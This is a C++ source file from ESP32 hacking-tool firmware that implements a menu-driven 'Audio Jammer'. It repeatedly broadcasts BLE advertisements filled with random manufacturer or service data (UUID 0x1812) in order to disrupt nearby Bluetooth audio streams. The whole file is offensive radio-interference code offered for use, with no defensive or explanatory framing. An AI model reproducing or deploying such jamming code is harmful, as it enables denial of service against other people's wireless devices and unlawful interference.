#if !defined(LITE_VERSION)
#include "audio_jammer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <globals.h>
#include <esp_task_wdt.h>

static volatile bool jammerRunning = false;
static int packetsSent = 0;

static void sendJammingPacket(NimBLEAdvertising *adv) {
    NimBLEAdvertisementData advData;

    std::string mfgData;
    for (int i = 0; i < 31; i++) {
        mfgData += (char)random(256);
    }

    advData.setManufacturerData(mfgData);
    advData.setFlags(0x06);
    adv->setAdvertisementData(advData);
}

void audioJammer() {
    options.clear();
    int mode = -1;
    options.push_back({"BLE Audio Jam", [&mode]() { mode = 0; }});
    options.push_back({"LE Audio Flood", [&mode]() { mode = 1; }});
    options.push_back({"All Modes", [&mode]() { mode = 2; }});
    options.push_back({"Back", [&mode]() { mode = -1; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Audio Jammer");

    if (mode < 0) return;

    NimBLEDevice::deinit(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);

    if (!NimBLEDevice::init("")) {
        displayError("BLE init failed", true);
        return;
    }

    NimBLEDevice::setSecurityAuth(false, false, false);
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();

    jammerRunning = true;
    packetsSent = 0;

    drawMainBorderWithTitle("Audio Jammer");
    int y = 45;

    tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, y);
    tft.print("Jamming BLE audio streams");
    y += 14;

    String modeStr = mode == 0 ? "BLE Audio" : mode == 1 ? "LE Audio" : "All";
    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
    tft.setCursor(12, y);
    tft.print("Mode: " + modeStr);
    y += 20;

    while (jammerRunning) {
        if (mode == 0 || mode == 2) {
            sendJammingPacket(pAdvertising);
        }
        if (mode == 1 || mode == 2) {
            NimBLEAdvertisementData serviceData;
            std::string sd;
            sd += (char)0x18;
            sd += (char)0x12;
            for (int i = 0; i < 29; i++) sd += (char)random(256);
            serviceData.setServiceData(NimBLEUUID((uint16_t)0x1812), sd);
            pAdvertising->setAdvertisementData(serviceData);
        }

        pAdvertising->start();
        delay(20);
        pAdvertising->stop();
        packetsSent++;

        if (packetsSent % 100 == 0) {
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(12, y);
            tft.printf("Packets: %d", packetsSent);

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) jammerRunning = false;
        esp_task_wdt_reset();
        delay(5);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
    displayInfo("Audio Jammer stopped", true);
}
#endif
